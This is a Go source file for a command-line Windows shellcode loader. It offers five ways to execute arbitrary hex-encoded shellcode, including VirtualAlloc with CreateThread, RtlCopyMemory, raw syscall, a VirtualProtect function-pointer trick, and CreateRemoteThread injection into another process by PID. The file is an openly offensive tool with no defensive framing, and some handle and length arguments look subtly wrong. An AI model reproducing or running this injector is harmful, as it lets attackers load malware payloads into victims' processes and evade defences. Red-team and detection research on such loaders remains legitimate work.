package main

import (
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT                = 0x1000
	MEM_RESERVE               = 0x2000
	PAGE_EXECUTE_READWRITE    = 0x40
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
	MEM_RELEASE               = 0x8000
)

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	ntdll    = syscall.NewLazyDLL("ntdll.dll")

	VirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	VirtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
	WriteProcessMemory  = kernel32.NewProc("WriteProcessMemory")
	CreateThread        = kernel32.NewProc("CreateThread")
	OpenProcess         = kernel32.NewProc("OpenProcess")
	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	procVirtualProtect  = kernel32.NewProc("VirtualProtect")
	CreateRemoteThread  = kernel32.NewProc("CreateRemoteThread")
	VirtualFreeEx       = kernel32.NewProc("VirtualFreeEx")
	GetExitCodeThread   = kernel32.NewProc("GetExitCodeThread")
	CloseHandle         = kernel32.NewProc("CloseHandle")
	RtlCopyMemory       = ntdll.NewProc("RtlCopyMemory")
)

//=========================================================
//		CreateThread
//=========================================================

// ShellCodeThreadExecute executes shellcode in the current process using VirtualAlloc and CreateThread
func ShellCodeThreadExecute(Shellcode string) {
	bShellcode := []byte(Shellcode)
	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(bShellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))
	ds, _ := hex.DecodeString(Shellcode)
	for i, value := range ds {
		AddrPtr[i] = value
	}
	ThreadAddr, _, _ := CreateThread.Call(0, 0, Addr, 0, 0, 0)
	WaitForSingleObject.Call(ThreadAddr, 0xFFFFFFFF)
}

//=========================================================
//		RTLCopyMemory
//=========================================================

// ShellCodeRTLCopyMemory executes shellcode in the current process using VirtualAlloc and RtlCopyMemory
func ShellCodeRTLCopyMemory(shellcode string) error {
	bShellcode := []byte(shellcode)
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(bShellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return err
	}
	ds, _ := hex.DecodeString(shellcode)
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&ds[0])), uintptr(len(shellcode)))
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			return err
		}
	}
	_, _, err = syscall.Syscall(addr, 0, 0, 0, 0)
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			return err
		}
	}
	return nil
}

//=========================================================
//		Function Pointer
//=========================================================

// VirtualProtect is used to set the memory region to PAGE_EXECUTE_READWRITE
func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

// ShellCodeVirtualProtect executes shellcode in the current process by using the VirtualProtect function and a function pointer
func ShellCodeVirtualProtect(sc string) {
	f := func() {}
	// Change permissions on f function ptr
	var oldfperms uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("Call to VirtualProtect failed!")
	}
	ds, _ := hex.DecodeString(sc)
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&ds))
	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&ds))), uintptr(len(ds)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		panic("Call to VirtualProtect failed!")
	}
	f()
}

//=========================================================
//		Syscall
//=========================================================

// ShellCodeSyscall executes shellcode using syscall.Syscall()
func ShellCodeSyscall(shellcode string) {
	bshellcode := []byte(shellcode)
	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(bshellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))
	if ds, err := hex.DecodeString(shellcode); err == nil {
		for i, value := range ds {
			AddrPtr[i] = value
		}
	}
	syscall.Syscall(Addr, 0, 0, 0, 0)
}

//=========================================================
//		CreateRemoteThread
//=========================================================
var nullRef int

// ShellCodeCreateRemoteThread spawns shellcode in a remote process
func ShellCodeCreateRemoteThread(PID int, Shellcode string) error {
	bshellcode := []byte(Shellcode)
	lAddr, _, _ := VirtualAlloc.Call(0, uintptr(len(bshellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	lAddrPtr := (*[6300000]byte)(unsafe.Pointer(lAddr))
	ds, _ := hex.DecodeString(Shellcode)
	for i, value := range ds {
		lAddrPtr[i] = value
	}
	var inheritHandle uint32 = 0
	pid32 := uint32(PID)
	remoteProcHandle, _, _ := OpenProcess.Call(
		PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,
		uintptr(inheritHandle),
		uintptr(pid32))
	if remoteProcHandle == 0 {
		err := errors.New("unable to open remote process")
		return err
	}
	lpBaseAddress, _, _ := VirtualAllocEx.Call(
		remoteProcHandle,
		uintptr(nullRef),
		uintptr(len(bshellcode)),
		MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if lpBaseAddress == 0 {
		err := errors.New("unable to allocate memory in remote process")
		return err
	}
	var nBytesWritten *byte
	writeMem, _, _ := WriteProcessMemory.Call(
		remoteProcHandle,
		lpBaseAddress,
		lAddr,
		uintptr(len(bshellcode)),
		uintptr(unsafe.Pointer(nBytesWritten)))
	if writeMem == 0 {
		err := errors.New("unable to write shellcode to remote process")
		return err
	}
	var threadID uint32 = 0
	var dwCreationFlags uint32 = 0
	remoteThread, _, _ := CreateRemoteThread.Call(
		remoteProcHandle,
		uintptr(nullRef),
		uintptr(0),
		lpBaseAddress,
		uintptr(0),
		uintptr(dwCreationFlags),
		uintptr(unsafe.Pointer(&threadID)))
	if remoteThread == 0 {
		err := errors.New("can't create remote thread")
		return err
	}
	var dwExitCode uint32
	rWaitvalue, _, _ := WaitForSingleObject.Call(lpBaseAddress, 0xFFFFFFFF)
	if rWaitvalue != 0 {
		err := errors.New("error returning thread wait state")
		return err
	}
	success, _, _ := GetExitCodeThread.Call(lpBaseAddress, uintptr(unsafe.Pointer(&dwExitCode)))
	if success == 0 {
		err := errors.New("error returning thread exit code")
		return err
	}
	closed, _, _ := CloseHandle.Call(lpBaseAddress)
	if closed == 0 {
		err := errors.New("error closing thread handle")
		return err
	}
	var dwFreeType uint32 = MEM_RELEASE
	var size uint32 = 0
	rFreeValue, _, _ := VirtualFreeEx.Call(
		remoteProcHandle,
		lpBaseAddress,
		uintptr(size),
		uintptr(dwFreeType))
	if rFreeValue == 0 {
		err := errors.New("error freeing process memory")
		return err
	}
	return nil
}

func main() {
	if len(os.Args) == 1 {
		fmt.Println("Usage: runshellcode -type NUM -shellcode fc488... [-pid NUM]")
	}
	var itype int
	var shellcode string
	var pid int
	flag.StringVar(&shellcode, "shellcode", "", "ShellCode to inject")
	flag.IntVar(&itype, "type", 1, "ShellCode injection technique to use.\n  1. ThreadExecute\n  2. RTLCopyMem\n  3. Syscall\n  4. Virtual Protect\n  5. CreateRemoteThread (requires PID)")
	flag.IntVar(&pid, "pid", 0, "process ID to inject shellcode into.")
	flag.Parse()
	if itype > 5 {
		fmt.Println("Type parameter must be between 1-5")
		return
	}
	switch itype {
	case 1:
		ShellCodeThreadExecute(shellcode)
	case 2:
		ShellCodeRTLCopyMemory(shellcode)
	case 3:
		ShellCodeSyscall(shellcode)
	case 4:
		ShellCodeVirtualProtect(shellcode)
	case 5:
		if pid != 0 {
			ShellCodeCreateRemoteThread(pid, shellcode)
		} else {
			fmt.Println("[!] Need a PID")
			return
		}
	}
}


// references: https://github.com/bluesentinelsec/OffensiveGoLang/blob/master/pkg/windows/execution/shellcode.go
//             https://github.com/lesnuages/hershell/blob/master/shell/shell_windows.go
//             https://medium.com/jettech/breaking-all-the-rules-using-go-to-call-windows-api-2cbfd8c79724